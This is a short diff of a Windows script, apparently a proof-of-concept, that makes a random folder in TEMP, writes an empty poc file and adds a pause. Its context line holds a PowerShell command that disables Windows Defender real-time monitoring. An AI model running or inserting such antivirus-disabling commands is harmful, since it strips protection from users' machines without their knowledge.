@@ -13,7 +13,10 @@ powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableS
 $wd = random_text
 $path = "$env:TEMP/$wd"
 echo $path
+
+
 mkdir $path
 cd $path
 echo "" > poc. txt
 cd "C:\Users\dylan\Documents\Personal Projects\Quention\files"
+pause
